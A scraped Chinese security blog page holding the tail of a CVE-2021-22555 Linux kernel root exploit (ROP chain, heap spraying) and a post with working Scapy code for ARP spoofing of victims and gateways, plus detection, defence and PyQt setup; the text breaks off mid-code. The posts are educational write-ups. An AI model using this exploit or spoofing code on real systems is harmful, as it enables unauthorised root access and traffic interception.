rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;PIG007XX&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_eflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 4-3. trigger pipe_release()</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Releasing pipe_buffer objects...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_PIPEFDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (close(pipefd[i][<span class="number">0</span>]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] close&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (close(pipefd[i][<span class="number">1</span>]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] close&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_rmid:</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == fake_idx)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (msgctl(msqid[i], IPC_RMID, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      perror(<span class="string">&quot;[-] msgctl&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">err_no_rmid:</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>效果：</p>
<p>中间有个<code>getchar()</code>，按下回车即可，本来放这是为了方便调试的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220515143144038.png" alt="image-20220515143144038"></p>
<p>不行的话可以多尝试几次</p>
<p>然后逃逸容器的我没尝试，也不太会，可以参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#FINAL-EXPLOIT" >arttnba3师傅的容器逃逸EXP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="参考"   >
          <a href="#参考" class="heading-link"><i class="fas fa-link"></i></a><a href="#参考" class="headerlink" title="参考"></a>参考</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254027" >CVE-2021-22555 2字节堆溢出写0漏洞提权分析 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT" >【CVE.0x07】CVE-2021-22555 漏洞复现及简要分析 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html" >CVE-2021-22555: Turning \x00\x00 into 10000$ | security-research (google.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>太多了，有点贴不过来了….</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/07/arp_spoof/">arp_spoof</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-03-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-07</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、原理"   >
          <a href="#一、原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、原理" class="headerlink" title="一、原理"></a>一、原理</h1>
      
        <h2 id="1-攻击"   >
          <a href="#1-攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-攻击" class="headerlink" title="1.攻击"></a>1.攻击</h2>
      
        <h3 id="1-欺骗受害者"   >
          <a href="#1-欺骗受害者" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-欺骗受害者" class="headerlink" title="(1)欺骗受害者"></a>(1)欺骗受害者</h3>
      <p>向受害者发包，欺骗受害者本机为网关，使得受害者的ARP表中本机的MAC地址为网关的MAC地址。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rep</span>(<span class="params">target_ip, gateway_ip</span>):</span></span><br><span class="line">    <span class="keyword">global</span> self_mac</span><br><span class="line">    target_mac = getmacbyip(target_ip)</span><br><span class="line">    <span class="comment">#print(gateway_ip)</span></span><br><span class="line">    <span class="keyword">if</span> target_ip <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error: Could not resolve targets MAC address&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># Ether对应包的src和dst   ARP只会修改其中的ARP包，告诉dst，这个包的mac是hwsrc，ip是psrc，发给hwdst/pdst</span></span><br><span class="line">    pkt = Ether(src=self_mac, dst=target_mac) / ARP(hwsrc=self_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip,</span><br><span class="line">                                                    op=<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 本机mac 受欺骗的主机mac 本机mac 网关的ip地址 被攻击人的mac 被攻击人的ip OP值是表示请求还是回应 1：请求  2：回应</span></span><br><span class="line">        <span class="comment"># 那么这种模式下即本机发往受害者，告诉受害者网关(psrc)的mac地址是本机(self_mac)，下回依据IP查ARP表就会把应该发给网关的包通过mac发包发给本机</span></span><br><span class="line">    <span class="keyword">return</span> pkt</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-欺骗网关"   >
          <a href="#2-欺骗网关" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-欺骗网关" class="headerlink" title="(2)欺骗网关"></a>(2)欺骗网关</h3>
      <p>向网关发包，欺骗网关受害者为本机，使得网关的ARP表中受害者的MAC地址为本机的MAC地址</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_req</span>(<span class="params">target_ip, gateway_ip</span>):</span></span><br><span class="line">    <span class="keyword">global</span> self_mac</span><br><span class="line">    target_mac = getmacbyip(target_ip)</span><br><span class="line">    gateway_mac = getmacbyip(gateway_ip)</span><br><span class="line">    <span class="keyword">if</span> target_mac <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error: Could not resolve targets MAC address&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Ether对应包的src和dst   ARP只会修改其中的ARP包，告诉dst，这个包的mac是hwsrc，ip是psrc，发给hwdst/pdst</span></span><br><span class="line">    pkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,</span><br><span class="line">                                                  op=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 本机mac 网关mac 本机mac 受欺骗的主机mac 网关mac 网关的ip地址 OP值是表示请求还是回应 1：请求  2：回应</span></span><br><span class="line">    <span class="comment"># 那么这种模式下即本机发往网关，告诉网关受害者(psrc)的mac地址是本机(self_mac)，下回依据IP查ARP表就会把应该发给受害者的包通过mac发包发给本机</span></span><br><span class="line">    <span class="keyword">return</span> pkt</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-欺骗所有人"   >
          <a href="#3-欺骗所有人" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-欺骗所有人" class="headerlink" title="(3)欺骗所有人"></a>(3)欺骗所有人</h3>
      <p>向广播地址发包，使得所有人的ARP都被修改，从而欺骗所有人，这个没有实现，感觉动静太大，没啥用</p>

        <h2 id="2-防御"   >
          <a href="#2-防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-防御" class="headerlink" title="2.防御"></a>2.防御</h2>
      
        <h3 id="1-检测"   >
          <a href="#1-检测" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-检测" class="headerlink" title="(1)检测"></a>(1)检测</h3>
      
        <h4 id="①rep模式"   >
          <a href="#①rep模式" class="heading-link"><i class="fas fa-link"></i></a><a href="#①rep模式" class="headerlink" title="①rep模式"></a>①rep模式</h4>
      <p>这种模式本机的arp表中的MAC地址会改变，linux下由于输入arp加载比较慢，估计后台会进行ping，所以使用<code>ip neigh</code>来获取，从中找到是否存在相同的MAC地址，从而判断是否被该模式攻击，即转化为set看长度是否相同</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#detect_rep</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(ip_mac_dictionary) != <span class="built_in">len</span>(<span class="built_in">set</span>(ip_mac_dictionary.values()))):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rep_get&quot;</span>)</span><br><span class="line">    rep_detect_flag = <span class="literal">True</span></span><br></pre></td></tr></table></div></figure>


        <h4 id="②req模式"   >
          <a href="#②req模式" class="heading-link"><i class="fas fa-link"></i></a><a href="#②req模式" class="headerlink" title="②req模式"></a>②req模式</h4>
      <p>这种模式下我们可以尝试arping网关，如果MAC地址没被修改，而arping网关不能通，那么就是网关被欺骗，依据此来进行检测</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#detect_req</span></span><br><span class="line">gateway_mac = getmacbyip(gateway_ip)</span><br><span class="line">p = subprocess.Popen([<span class="string">&quot;arping&quot;</span>,<span class="string">&quot;-i&quot;</span>,netD_name,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;1&quot;</span>,gateway_mac], stdout=subprocess.PIPE)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> p.stdout.readlines():</span><br><span class="line">    line_splitby_space = line.decode(<span class="string">&quot;utf-8&quot;</span>).strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;Timeout&quot;</span> <span class="keyword">in</span> line_splitby_space):</span><br><span class="line">        req_detect_flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="2-实际防御"   >
          <a href="#2-实际防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-实际防御" class="headerlink" title="(2)实际防御"></a>(2)实际防御</h3>
      
        <h4 id="①rep模式-1"   >
          <a href="#①rep模式-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#①rep模式-1" class="headerlink" title="①rep模式"></a>①rep模式</h4>
      <p>直接将网关真实的MAC地址和对应IP进行静态绑定即可。获取网关真实MAC地址，可以使用getmacbyip函数，该函数会向局域网内广播，询问网关真实的MAC的地址，而攻击者那里肯定存在真实的MAC地址，所以基本一定能获得到真实的IP地址</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071205089.png" alt="image-20220307120520964"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(rep_detect_flag):</span><br><span class="line">    self.ui.defenseInfoText.appendPlainText(<span class="string">&quot;Defending against arp_rep attacks......&quot;</span>)</span><br><span class="line">    build_rep_defense()</span><br><span class="line">    p = subprocess.Popen([<span class="string">&quot;ip&quot;</span>, <span class="string">&quot;neigh&quot;</span>], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> p.stdout.readlines():</span><br><span class="line">        line_splitby_space = line.decode(<span class="string">&quot;utf-8&quot;</span>).strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;FAILED&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> line_splitby_space):</span><br><span class="line">            self.ui.defenseInfoText.appendPlainText(<span class="string">&#x27;&#123;:&lt;30s&#125;&#x27;</span>.<span class="built_in">format</span>(line_splitby_space[<span class="number">0</span>]) + <span class="string">&quot;\t&quot;</span> + line_splitby_space[<span class="number">4</span>])</span><br></pre></td></tr></table></div></figure>

<p>这里我直接修改所有的的IP_MAC为静态的</p>

        <h4 id="②req模式-1"   >
          <a href="#②req模式-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#②req模式-1" class="headerlink" title="②req模式"></a>②req模式</h4>
      <p>由于是网关被欺骗了，所以我们也可以向网关发包，使其将我的IP和MAC真实写入ARP欺骗，但是攻击者可能会一直发包，所以我们也需要一直发包才能断续防御攻击，不过还是可能会丢不少包。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_req_defense</span>():</span></span><br><span class="line">    <span class="keyword">global</span> gateway_ip</span><br><span class="line">    <span class="keyword">global</span> self_mac</span><br><span class="line">    self_ip = get_self_ip()</span><br><span class="line">    <span class="comment">#self_mac = get_if_hwaddr(netD_name)</span></span><br><span class="line">    gateway_mac = getmacbyip(gateway_ip)</span><br><span class="line">    <span class="comment">#Ether对应包的src和dst   ARP只会修改其中的ARP包，告诉dst，这个包的mac是hwsrc，ip是psrc，发给hwdst/pdst</span></span><br><span class="line">    pkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=self_ip, hwdst=gateway_mac, pdst = gateway_ip,op=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> pkt</span><br></pre></td></tr></table></div></figure>

<p>如上设置包内容，告诉网关我才是真的。</p>
<p>或者有网关权限的，直接在网关的shell进行静态绑定。</p>

        <h1 id="二、pyQt界面"   >
          <a href="#二、pyQt界面" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、pyQt界面" class="headerlink" title="二、pyQt界面"></a>二、pyQt界面</h1>
      
        <h2 id="1-环境搭建"   >
          <a href="#1-环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h2>
      <p>主要配合pycharm，先安装pyQt5，然后在对应的包里即可打开</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install PyQt5</span><br><span class="line">/home/hacker/.<span class="built_in">local</span>/lib/python3.6/site-packages/qt5_applications/Qt/bin/designer</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-配合pycharm"   >
          <a href="#2-配合pycharm" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-配合pycharm" class="headerlink" title="2.配合pycharm"></a>2.配合pycharm</h2>
      <p>主要设置一下即可</p>
<p>File-&gt;setting-&gt;Tools-&gt;External Tools-&gt;+一下工具</p>

        <h3 id="Qt-Designer"   >
          <a href="#Qt-Designer" class="heading-link"><i class="fas fa-link"></i></a><a href="#Qt-Designer" class="headerlink" title="Qt_Designer"></a>Qt_Designer</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071121488.png" alt="image-20220307112101403"></p>
<p>直接点击即可加载</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071125687.png" alt="image-20220307112540614"></p>

        <h3 id="UI转py"   >
          <a href="#UI转py" class="heading-link"><i class="fas fa-link"></i></a><a href="#UI转py" class="headerlink" title="UI转py"></a>UI转py</h3>
      <p>转完之后会比较舒服，因为在pycharm中可以提示相关的控件，但是直接load加载ui文件的话就没有提示。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071121263.png" alt="image-20220307112150183"></p>
<p>Arguments的命令参数为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-m PyQt5.uic.pyuic $FileName$ -o $FileNameWithoutExtension$.py</span><br></pre></td></tr></table></div></figure>

<p>目前好像py-&gt;ui没办法转回去</p>
<p>之后点击要转换的ui文件，然后对应的打开工具即可在当前文件夹下生成py文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071127006.png" alt="image-20220307112701929"></p>
<p>对应就会生成<code>window.py</code>文件</p>

        <h2 id="3-界面启动"   >
          <a href="#3-界面启动" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-界面启动" class="headerlink" title="3.界面启动"></a>3.界面启动</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainWindow</span>(<span class="params">QMainWindow</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="comment">#导入ui</span></span><br><span class="line">        self.ui = Ui_MainWindow()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication([])</span><br><span class="line">    myWindow = MainWindow()</span><br><span class="line">    myWindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></div></figure>


        <h2 id="4-界面退出"   >
          <a href="#4-界面退出" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-界面退出" class="headerlink" title="4.界面退出"></a>4.界面退出</h2>
      <p>一般界面都是多线程的，所以退出的时候一般需要加上一些东西将一些线程给关闭，安全退出，所以需要重写一下窗口关闭的closeEvent函数</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">closeEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> threads_flag_dictionary.keys():</span><br><span class="line">        threads_flag_dictionary[key].<span class="built_in">set</span>()<span class="comment">#相关线程终止flag设置</span></span><br><span class="line">    event.accept()</span><br><span class="line">    os._exit(<span class="number">0</span>)</span><br></pre></td></tr></table></div></figure>




        <h1 id="三、利用函数详解"   >
          <a href="#三、利用函数详解" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、利用函数详解" class="headerlink" title="三、利用函数详解"></a>三、利用函数详解</h1>
      
        <h2 id="1-发包函数"   >
          <a href="#1-发包函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-发包函数" class="headerlink" title="1.发包函数"></a>1.发包函数</h2>
      
        <h3 id="1-Ether"   >
          <a href="#1-Ether" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Ether" class="headerlink" title="(1)Ether"></a>(1)Ether</h3>
      <p>主要就是使用Ether创建一个MAC数据帧头，即源MAC地址，要发往的MAC地址，这个不能更改，用来在局域网中设置发往的地方。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ether(src=self_mac, dst=gateway_mac)</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-ARP"   >
          <a href="#2-ARP" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ARP" class="headerlink" title="(2)ARP"></a>(2)ARP</h3>
      <p>这个就是用来伪造数据包中的ARP数据，可以随便改，目标主机接收到该数据包的时候，会判断是否和本机的ARP表是否相同，不同则会依据该ARP包来进行修改。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,op=<span class="number">1</span>)</span><br></pre></td></tr></table></div></figure>

<p>ARP欺骗主要就是修改<code>hwsrc/psrc</code>，使得目标主机的ARP表依据该<code>hwsrc/psrc</code>来对自己的ARP表进行写入。比如这里就是使得目标主机中的ARP表由原本正确的<code>target_ip---target_MAC</code>变为<code>target_ip---self_mac</code></p>

        <h3 id="3-实际发包"   >
          <a href="#3-实际发包" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-实际发包" class="headerlink" title="(3)实际发包"></a>(3)实际发包</h3>
      <p>需要将Ether和ARP结合起来组成一个MAC帧pkt，然后就可以将该MAC帧发往网卡<code>network driver</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,op=<span class="number">1</span>)</span><br></pre></td></tr></table></div></figure>


        <h4 id="①send"   >
          <a href="#①send" class="heading-link"><i class="fas fa-link"></i></a><a href="#①send" class="headerlink" title="①send"></a>①send</h4>
      <p>工作在第三层网络层，发送IP数据包，包头需要是IP数据包头</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(IP(dst=<span class="string">&quot;192.168.1.107&quot;</span>)/ICMP())</span><br></pre></td></tr></table></div></figure>


        <h4 id="②sendp"   >
          <a href="#②sendp" class="heading-link"><i class="fas fa-link"></i></a><a href="#②sendp" class="headerlink" title="②sendp"></a>②sendp</h4>
      <p>工作在第二层链路层，发送MAC帧，包头需要是MAC帧头，即Ether</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sendp(pkt, inter=<span class="number">2</span>, iface=netD_name)</span><br><span class="line"><span class="comment">#这里pkt就是包，即Ether()/ARP()之类的</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="2-线程函数"   >
          <a href="#2-线程函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-线程函数" class="headerlink" title="2.线程函数"></a>2.线程函数</h2>
      <p>使用pyQt线程函数，一般两种方法，比较喜欢用threading的</p>

        <h3 id="1-线程启动"   >
          <a href="#1-线程启动" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-线程启动" class="headerlink" title="(1)线程启动"></a>(1)线程启动</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置终止信号，防止线程一直运行不停止</span></span><br><span class="line">send_thread_defense_stop_flag = threading.Event()</span><br><span class="line"><span class="comment">#线程创建，对应self.send_pack函数，参数为args=(xxx,xxx,xxx)</span></span><br><span class="line">send_thread = threading.Thread(target=self.send_pack, args=(pkt,send_thread_defense_stop_flag,<span class="string">&quot;defense&quot;</span>))</span><br><span class="line"><span class="comment">#线程启动</span></span><br><span class="line">send_thread.start()</span><br><span class="line"><span class="comment">#将终止信号添加进字典进行管理</span></span><br><span class="line">threads_flag_dictionary[<span class="string">&#x27;send_defense_thread&#x27;</span>] = send_thread_defense_stop_flag</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-线程阻塞"   >
          <a href="#2-线程阻塞" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-线程阻塞" class="headerlink" title="(2)线程阻塞"></a>(2)线程阻塞</h3>
      <p>有时候需要线程阻塞，即完成该线程才进行下一步，那么就需要用到join函数</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用在send_thread.start()之后</span></span><br><span class="line">send_thread.join()</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-线程终止"   >
          <a href="#3-线程终止" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-线程终止" class="headerlink" title="(3)线程终止"></a>(3)线程终止</h3>
      <p>即之前提到的设置对应的终止flag</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#触发停止信号</span></span><br><span class="line">threads_flag_dictionary[<span class="string">&#x27;send_defense_thread&#x27;</span>].<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">#send_pack函数中某些需要一直运行的代码块中</span></span><br><span class="line"><span class="keyword">while</span> (stop_flag.is_set()):</span><br><span class="line">	<span class="keyword">pass</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="3-其他功能性函数"   >
          <a href="#3-其他功能性函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-其他功能性函数" class="headerlink" title="3.其他功能性函数"></a>3.其他功能性函数</h2>
      
        <h3 id="1-获取存活主机函数"   >
          <a href="#1-获取存活主机函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-获取存活主机函数" class="headerlink" title="(1)获取存活主机函数"></a>(1)获取存活主机函数</h3>
      <p>由于<code>ip neigh</code>命令会从一个存活主机的缓冲区中获取相关的主机，但是实际上如果新加入一个主机，则不会显示出来，除非接收到该主机的包，所以我们需要主动去ping他们，看他们是否存活。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ip_prefix = <span class="string">&#x27;.&#x27;</span>.join(gateway_ip.split(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">    ip = <span class="string">&#x27;%s.%s&#x27;</span> % (ip_prefix, i)</span><br><span class="line">    threads.append(threading.Thread(target=ping_ip, args=&#123;ip, &#125;))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">    i.start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">    i.join()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping_ip</span>(<span class="params">ip_str</span>):</span></span><br><span class="line">    cmd = [<span class="string">&quot;ping&quot;</span>, <span class="string">&quot;-c&quot;</span>,<span class="string">&quot;1&quot;</span>, ip_str]</span><br><span class="line">    output = os.popen(<span class="string">&quot; &quot;</span>.join(cmd)).readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> 